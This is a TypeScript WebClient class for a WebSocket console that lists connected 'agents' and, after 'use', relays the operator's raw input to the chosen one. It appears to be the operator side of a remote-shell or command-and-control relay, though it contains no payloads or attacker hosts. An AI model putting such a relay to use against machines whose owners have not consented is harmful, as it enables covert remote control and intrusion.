// import os, { UserInfo } from 'os';
import fs from 'fs';
import path from 'path';
import Convert from 'ansi-to-html';
import { Socket } from 'net';
import { WebSocket } from 'ws';
import { Base, BaseSocket, IBaseConnectable } from './Base';
import { Controller } from './Controller';

export class WebClient extends Base implements IBaseConnectable {
  public signature?: string;
  public commands: string[] = ['ls', 'use', 'reg', 'ping', 'info', 'help', 'exit'];
  public methods: string[] = ['message', 'close', 'error'];
  public relay?: IBaseConnectable;
  public convert: Convert;
  public disconnecting?: boolean;

  constructor(public ctl: Controller, public socket: WebSocket, public prompt?: string) {
    super();

    this.convert = new Convert();

    const forwardEvents = ['close', 'error', 'message', 'open', 'ping', 'pong', 'upgrade', 'unexpected-response'];

    forwardEvents.forEach((e) => {
      this.socket.on(e, (...args) => {
        this.log.debug(`Socket.on(${e})`, args);
        this.emit(e, ...args);
      });
    });

    this.init();
  }

  public write(msg: string, cb?: (err?: Error) => void): void {
    this.log.info(`Write msg: ${msg}`);
    this.socket.send(this.convert.toHtml(msg.toString()), cb);
  }

  public send(msg: string, keep = true): void {
    this.log.info(`Sending msg: ${msg}`);

    if (this.prompt) {
      this.write(msg);

      if (keep) {
        this.write(`\n${this.prompt}`);
      }
    }
  }

  public init(commands: string[] = []): void {
    this.commands = this.commands.concat(commands);
    this.ready();

    [...this.commands].concat(this.methods).forEach((cmd) => {
      if (typeof this[cmd] === 'function') {
        this.on(cmd, this[cmd].bind(this));
      } else {
        this.log.warn(`Cannot autoload method: ${cmd}`);
      }
    });
  }

  public ready(): void {
    this.send(`[${this.id}] ${this.constructor.name} is ready`);
  }

  public ls(...args: string[]) {
    const { agents } = this.ctl;
    const lines = [...args].concat(['Agent List:']);

    if (agents.length) {
      this.ctl.agents.forEach((agent, index) => {
        lines.push(`\t[${index}] ${agent.signature} | ${agent.id}`);
      });

      lines.push('');
      lines.push(`Select an available agent with: "use [0-${this.ctl.agents.length - 1}]"`);
    } else {
      lines.push(`\tNo available agents`);
    }

    this.send(lines.join(`\n`));
  }

  public use(target: string) {
    const index = Number(target);

    if (!isNaN(index) && index >= 0 && index < this.ctl.agents.length) {
      const agent = this.ctl.agents[index];
      this.prompt = `${agent.signature}:${this.ctl.prompt} `;
      this.send(`Using [${index}]: ${agent.signature} | ${agent.id}`);
      this.relay = agent;
      agent.relay = this;
    } else {
      this.send(`Missing/invalid agent target: ${target}`);
    }
  }

  public reset(): void {
    this.prompt = this.ctl.prompt;

    if (this.relay) {
      this.log.debug(`Exit relay:`, this.relay.signature, this.relay.id);
      this.relay.write('exit');
      delete this.relay;
    }
  }

  public message(data): void {
    const [cmd, ...args] = data
      .toString()
      .split(' ')
      .map((str) => str.trim());

    if (this.relay) {
      if (cmd === 'exit') {
        this.reset();
      } else {
        this.log.debug(`Relay data: ${data}`, this.relay.signature, this.relay.id);
        this.relay.write(data);

        // if (this.relay.prompt) {
        //   this.relay.write(`\n${this.relay.prompt}`);
        // }
      }
    } else {
      if (this.commands.includes(cmd)) {
        this.log.debug(`Running cmd: ${data}`);
        this.emit(cmd, ...args);
      } else {
        this.log.warn(`Unknown cmd: ${cmd}`);
        this.send(`Unknown cmd: ${cmd} (available: ${this.commands.join(', ')})`);
      }
    }
  }

  public reg(sig: string): void {
    if (sig) {
      this.signature = sig;
      this.log.info(`Registered as: ${sig}`);
      this.send(`Registered as: ${sig}`);
      this.emit('registered');
    } else {
      this.log.warn(`Cannot register without signature!`, sig);
      this.send(`Cannot register without signature!`);
    }
  }

  public ping(): void {
    this.send('pong');
  }

  public info(prop: string): void {
    if (prop && this[prop]) {
      this.log.info(`Show prop info: ${prop}`, this[prop]);
      this.send(JSON.stringify(this[prop], null, 2));
    } else {
      this.log.warn(`Show info missing prop!`);
      this.send(`Show info missing prop! (${Object.keys(this).join(', ')})`);
    }
  }

  public help(): void {
    this.log.info(`HELP: Commands: ${this.commands.join(', ')}`);
    this.send(`HELP: Commands: ${this.commands.join(', ')}`);
  }

  public exit(msg = 'Goodbye.'): void {
    this.send(`${msg}\n`, false);
    // this.socket.destroy();
  }

  // public end() {
  //   this.log.debug(`Ending`);
  //   this.disconnect();
  // }

  public close(hasError: boolean) {
    this.log.debug(`Closing`, { hasError });
    this.disconnect();
  }

  public error(err: Error): void {
    this.log.error(err.message);
    this.disconnect();
  }

  public disconnect(): void {
    if (!this.disconnecting) {
      this.disconnecting = true;
      this.log.debug(`Disconnecting`);
      this.ctl.disconnect(this);

      if (this.relay) {
        this.relay.reset();
        // this.relay.send('Disconnected');
      }
    }
  }
}
